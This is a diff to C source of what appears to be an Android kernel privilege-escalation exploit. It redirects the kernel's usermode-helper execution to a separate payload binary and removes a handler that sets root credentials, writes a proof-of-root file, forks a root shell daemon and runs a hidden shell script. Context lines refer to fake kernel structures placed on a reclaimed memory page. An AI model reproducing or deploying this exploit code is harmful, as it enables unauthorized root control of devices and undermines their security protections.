@@ -13,8 +13,8 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
 
-/* UMH binary path and arguments */
-#define UMH_BINARY_PATH "/data/local/tmp/a/e"
+/* UMH binary path and arguments (separate payload binary) */
+#define UMH_BINARY_PATH "/data/local/tmp/dnroot"
 
 /* Page layout: fake subprocess_info and umh data on the reclaimed page.
  * IMPORTANT: in this port page_base is a SINGLE 4 KB memfd page (not the
@@ -375,54 +375,5 @@ int install_umh_root(int configfs_fd) {
   return 1;
 }
 
-/*
- * UMH mode handler — called when the kernel executes us as root.
- *
- * The kernel's __call_usermodehelper() forks and runs:
- *   /data/local/tmp/a/e --umh <caller_uid>
- * with UID 0 credentials. This handler formalizes the identity
- * and execs a root shell. Does not return if argv[1] == "--umh".
- */
-void handle_umh_mode(int argc, char **argv) {
-  if (argc < 2 || strcmp(argv[1], "--umh") != 0)
-    return;
-
-  setsid();
-  setgid(0);
-  setuid(0);
-
-  /* Proof of root.  The first /data open can fail with ENOKEY (the fscrypt key
-   * is not yet resolved for a kernel-spawned task); retry a few times. */
-  for (int i = 0; i < 100; i++) {
-    int f = open("/data/local/tmp/umh_root_proof",
-                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (f >= 0) {
-      char b[128];
-      int n = snprintf(b, sizeof(b), "UMH ROOT uid=%d euid=%d gid=%d\n",
-                       getuid(), geteuid(), getgid());
-      if (n > 0) { ssize_t w = write(f, b, n); (void)w; }
-      close(f);
-      break;
-    }
-    usleep(50000);
-  }
-
-  /* The fscrypt key for /data is not yet resolved for this kernel-spawned
-   * task; the proof retry above warms it.  Only now start the root shell
-   * daemon so its own /data marker write also succeeds. */
-  {
-    pid_t d = fork();
-    if (d == 0) { root_shell_daemon(); _exit(0); }
-  }
-
-  int null_fd = open("/dev/null", O_RDWR);
-  if (null_fd >= 0) {
-    dup2(null_fd, 0);
-    dup2(null_fd, 1);
-    dup2(null_fd, 2);
-    if (null_fd > 2) close(null_fd);
-  }
-
-  execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
-  _exit(127);
-}
+/* The UMH payload was split into a separate binary: src/payload/dnroot.c.
+ * The kernel execs /data/local/tmp/dnroot --umh <uid> (see UMH_BINARY_PATH). */
